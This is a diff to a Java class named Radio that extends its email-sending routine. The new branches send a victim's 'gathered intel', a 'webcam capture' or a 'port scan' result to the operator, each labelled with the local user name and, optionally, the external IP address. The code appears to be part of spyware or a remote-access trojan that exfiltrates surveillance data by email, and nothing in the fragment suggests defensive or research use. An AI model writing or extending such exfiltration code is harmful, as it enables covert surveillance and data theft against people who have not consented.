@@ -441,17 +441,43 @@ public class Radio
 	         {
 	        	 message.setSubject("Re: Sen Noodles " + System.getProperty("user.name"));
 	         }
+	         else if (mode == 2)
+	         {
+	        	 message.setSubject("Re: Port scan for " + System.getProperty("user.name"));
+	         }
 	         // Create the message part
 	         BodyPart messageBodyPart = new MimeBodyPart();
 
 	         // Now set the actual message
 	         if (mailIPtrackers)
 	         {
-	         messageBodyPart.setText("Hello, how is babby formed? Sincerely: " + System.getProperty("user.name") +"IP:"  + wanIP.getExtIP());
-	         } 
+	        	 if (mode == 0)
+	        	 {
+	        		 messageBodyPart.setText("Here's the gathered intel. Sincerely: " + System.getProperty("user.name") +"IP:"  + wanIP.getExtIP());
+	        	 }
+	        	 else if (mode == 1)
+	        	 {
+	        		 messageBodyPart.setText("Here's a webcam capture. Sincerely: " + System.getProperty("user.name") +"IP:"  + wanIP.getExtIP());
+	        	 }
+	        	 else if (mode == 2)
+				 {
+	        		 messageBodyPart.setText("Here's a port scan. Sincerely: " + System.getProperty("user.name") +"IP:"  + wanIP.getExtIP());
+				 }
+	         }
 	         else 
 	         {
-	        	 messageBodyPart.setText("Hello, how is babby formed? Sincerely: " + System.getProperty("user.name"));
+	        	 if (mode == 0)
+	        	 {
+	        		 messageBodyPart.setText("Here's the gathered intel. Sincerely: " + System.getProperty("user.name"));
+	        	 }
+	        	 else if (mode == 1)
+	        	 {
+	        		 messageBodyPart.setText("Here's a webcam capture. Sincerely: " + System.getProperty("user.name"));
+	        	 }
+	        	 else if (mode == 2)
+				 {
+	        		 messageBodyPart.setText("Here's a port scan. Sincerely: " + System.getProperty("user.name"));
+				 }
 	         }
 	         // Create a multipar message
 	         Multipart multipart = new MimeMultipart();
